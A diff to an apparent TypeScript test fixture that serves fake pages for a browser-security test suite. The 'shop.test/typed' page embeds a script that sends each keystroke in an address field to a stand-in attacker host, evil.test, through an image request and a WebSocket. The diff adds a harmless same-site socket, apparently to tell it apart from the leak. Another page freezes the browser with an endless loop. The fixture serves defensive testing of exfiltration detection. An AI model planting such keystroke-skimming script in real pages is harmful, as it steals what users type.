@@ -151,12 +151,14 @@ export async function startFixture(): Promise<Fixture> {
         // the page hangs a moment after the click, when no step runs.
         return send(200, html('<button onclick="setTimeout(() => { for (;;) {} }, 500)">Freeze</button><p>calm</p>', 'Freeze'));
       case 'shop.test/typed':
-        // a script sends each key to another site, with an image and a web socket. no form is sent.
+        // a script sends each key to another site, with an image and a web socket. no form is sent. the page also opens a
+        // socket to its own site.
         return send(
           200,
           html(
             `<label>Address <input id="a"></label>
-            <script>document.getElementById('a').addEventListener('input', (e) => {
+            <script>new WebSocket('${at('shop.test', '/ws-own').replace('http:', 'ws:')}');
+            document.getElementById('a').addEventListener('input', (e) => {
               new Image().src = '${at('evil.test', '/img')}?v=' + encodeURIComponent(e.target.value);
               try { new WebSocket('${at('evil.test', '/ws').replace('http:', 'ws:')}?v=' + encodeURIComponent(e.target.value)); } catch {}
             });</script>`,
